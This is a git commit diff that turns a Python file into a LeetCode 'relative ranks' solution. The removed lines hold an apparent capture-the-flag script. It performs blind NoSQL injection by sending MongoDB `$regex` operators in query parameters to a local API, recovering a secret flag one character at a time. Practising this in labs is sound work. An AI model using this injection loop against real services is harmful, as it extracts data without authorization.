9e38dff77ee6a55bc32c945045674d28fbcb5b59
skyepodium <skyepodium@gmail.com>
2023-12-02 23:04:02 +0900

    leetcode - relative-ranks

--- algorithm.py
+++ algorithm.py
@@ -1,27 +1,31 @@
-import string
-from urllib.parse import urlencode
+from typing import List
 
-import requests
 
-base_url = "http://localhost:3000/api/v1/post"
-table = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_"
+class Solution:
+    def findRelativeRanks(self, score: List[int]) -> List[str]:
+        # 1. init
+        medals = ['Gold Medal', 'Silver Medal', 'Bronze Medal']
 
-flag = ""
+        # 2. sort
+        sorted_score = sorted(score, reverse=True)
 
-while True:
-    for char in table:
-        params = {
-            "searchParam[deleted]": "true",
-            "searchParam[flag][$regex]": f"^{flag}{char}"
-        }
-        query_string = urlencode(params)
-        result = requests.get(f"{base_url}?{query_string}")
-        posts = result.json()
-        if len(posts) > 0:
-            flag += char
-            print(flag)
-            break
-    if "}" in flag:
-        break
+        # 3. rank
+        rank = {}
+        for i, s in enumerate(sorted_score):
+            if i < 3:
+                rank[s] = medals[i]
+            else:
+                rank[s] = str(i + 1)
 
-print("flag", flag)
+        # 4. return
+        return [rank[s] for s in score]
+
+
+sl = Solution()
+
+score = [5, 4, 3, 2, 1]
+score = [10, 3, 8, 9, 4]
+
+res = sl.findRelativeRanks(score)
+
+print('res', res)
